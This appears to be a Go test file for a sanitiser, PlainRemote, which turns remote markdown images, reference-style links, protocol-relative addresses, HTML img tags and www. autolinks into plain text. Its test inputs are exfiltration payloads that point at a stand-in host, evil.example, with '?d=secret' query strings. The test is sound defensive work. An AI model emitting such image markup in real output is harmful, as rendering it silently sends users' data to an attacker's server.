package guard

import (
	"regexp"
	"strings"
	"testing"
)

// outsideCode is s without its code spans (what a markdown renderer could still treat as markup).
func outsideCode(s string) string {
	return regexp.MustCompile("`[^`]*`").ReplaceAllString(s, "")
}

// refDef is a CommonMark link reference definition, at a line start or after container markers (quotes, list items).
var refDef = regexp.MustCompile(`(?m)^(?:[ \t]*(?:>|[-*+]|\d{1,9}[.)])[ \t]*)*[ \t]{0,3}\[[^\]\n]+\]:`)

// Review 2, L4 (its vprobe2): reference-style images and links, protocol-relative (//host) addresses, definitions
// inside quotes and lists, and www. autolinks come back as plain text: the host never appears outside code, no
// definition is left, and no image markup.
func TestPlainRemoteReferencesAndRelative(t *testing.T) {
	for _, in := range []string{
		"Summary ![x][1]\n\n[1]: //evil.example/p.png?d=secret",
		"Summary ![x][1]\n\n[1]: https://evil.example/p.png?d=secret",
		"Summary ![x][1]\n\n[1]:\n  //evil.example/p.png?d=secret \"title\"",
		"Summary ![x][]\n\n[x]: <//evil.example/p.png?d=secret>",
		"Summary ![x]\n\n[x]: //evil.example/p.png?d=secret",
		"Summary ![x][a]\n\n> [a]: //evil.example/p.png?d=secret",
		"Summary ![x][b]\n\n- [b]: //evil.example/p.png?d=secret",
		"Summary ![x][c]\n\n1. [c]: //evil.example/p.png?d=secret",
		"   [d]: //evil.example/p.png?d=secret\n![x][d]",
		"![a](https://evil.example/a.png)",
		"![a](//evil.example/c.png)",
		"[a](//evil.example/c)",
		"<img src=https://evil.example/b.png>",
		"see www.evil.example/p?d=secret now",
	} {
		out := PlainRemote(in)
		plain := outsideCode(out)
		if strings.Contains(plain, "evil.example") {
			t.Errorf("%q\n  -> %q: the host is outside code", in, out)
		}
		if refDef.MatchString(out) {
			t.Errorf("%q\n  -> %q: a reference definition is left", in, out)
		}
		if strings.Contains(plain, "![") {
			t.Errorf("%q\n  -> %q: image markup is left", in, out)
		}
	}
}
